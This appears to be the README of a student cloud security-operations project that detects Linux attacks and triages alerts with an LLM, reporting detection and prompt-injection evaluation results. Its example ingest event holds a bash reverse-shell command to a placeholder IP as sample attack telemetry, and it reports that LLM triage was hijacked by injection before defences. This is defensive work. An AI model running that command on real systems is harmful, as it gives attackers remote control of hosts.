# Aegis-SOC

Cloud-native, AI-assisted security operations platform that runs on Google Cloud's **free tier at
$0/month**: ingest Linux telemetry → detect with ATT&CK-mapped rules + anomaly baseline → triage
each alert with an LLM → gate containment behind a deterministic policy.

Built for an M.Tech Advanced Cloud Computing project. `REPORT.md` contains the full write-up and
the measured evaluation.

```
POST /ingest ──▶ normalise (ECS-lite)
                     │
        ┌────────────┴─────────────┐
        ▼                          ▼
  13 ATT&CK rules          anomaly baseline
        └────────────┬─────────────┘
                     ▼
              fusion (per technique)
                     ▼
            LLM triage  ──▶ strict JSON schema
                     ▼
        Firestore  ←→  operator console
                     ▼
        policy gate ──▶ simulated edge block
```

## Quick start (no cloud account, no API key)

```bash
python3 -m venv .venv && . .venv/bin/activate
pip install -r requirements.txt

python lab/gen_corpus.py          # generate labelled corpus + baseline
uvicorn app.main:app --port 8080  # open http://localhost:8080
```

Open the console and press **Run attack simulation**. Everything works offline: storage is SQLite
and the LLM runs in a deterministic mock mode that is labelled `simulated` in the UI and in
`/api/health`.

Then generate the evaluation numbers:

```bash
python scripts/eval.py            # writes evals/results.json
```

## Measured results

| Phase | Result |
|---|---|
| Benign replay (600 events) | 0 false positives |
| Attack corpus (13 techniques) | recall 1.000, precision 1.000, F1 1.000 |
| **Evasion set (6 variants)** | **attribution 1/6 (0.17)** — the honest number |
| **Prompt injection, undefended** | **ASR 58.3% (7/12 hijacked)** |
| **Prompt injection, defences D1–D5** | **ASR 0.0% (0/12)** |
| Cost | $0.00 |

The 1.000 in row 2 is a correctness check on the pipeline, not a claim about real-world detection —
the corpus and the rules were written together. Row 3 is what the detector is actually worth. Both
statements are in `REPORT.md §7.1`.

## Two modes

| | Local demo | Cloud |
|---|---|---|
| Store | SQLite (`data/aegis.db`) | Firestore |
| LLM | mock (deterministic, labelled) | Gemini free tier, mock fallback |
| Run | `uvicorn app.main:app` | Cloud Run |

Set `GEMINI_API_KEY` to switch the LLM from mock to live; the console header and every triage
record show which mode produced a result. If the API call fails or returns malformed JSON, triage
falls back to mock and records `mode: gemini-fallback` — a demo never dies because a quota did.

## Deploy to GCP (free tier)

```bash
export PROJECT_ID=your-project REGION=us-central1 GEMINI_API_KEY=...
./deploy.sh
```

The script enables only the APIs used, creates a Firestore database, an Artifact Registry repo, a
Secret Manager entry for the key, builds one image via Cloud Build, and deploys Cloud Run with
`--max-instances=3 --memory=512Mi`. See `docs/DEPLOY_NOTES.md` for the cost guardrails to apply
first.

## API

| Method | Path | Purpose |
|---|---|---|
| POST | `/ingest` | One event, `[...]`, or `{"events":[...]}` |
| GET | `/api/alerts?limit=` | Alert queue |
| GET | `/api/alerts/{id}` | Alert + triage |
| POST | `/api/alerts/{id}/triage?defenses=true|false` | Re-triage, toggle defences |
| POST | `/api/alerts/{id}/block` | Policy gate (D4) — LLM verdict is not an input |
| GET | `/api/stats` · `/api/health` | Counters, mode |
| POST | `/api/simulate/attack` · `/api/simulate/injection` · `/api/reset` | Demo helpers |

Example event:

```bash
curl -X POST localhost:8080/ingest -H 'content-type: application/json' -d '{
  "ts": "2026-10-19T08:00:00Z", "host": "web-01", "user": "root",
  "event_type": "process", "process": "bash",
  "cmdline": "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"
}'
```

## Layout

```
app/          schema.py store.py detect.py triage.py injections.py main.py static/
lab/          gen_corpus.py          # benign + attack + evasion corpus
scripts/      eval.py                # regenerates every number
docs/         DEMO_SCRIPT.md VIVA_QA.md DEPLOY_NOTES.md
REPORT.md     full project report
```

## Deliberate non-goals

No multi-tenant auth, no Windows/network telemetry, no live firewall changes
(`APPLY_BLOCKS=simulated`), no long-term retention. These are listed as limitations in the report
rather than quietly implied to be done.
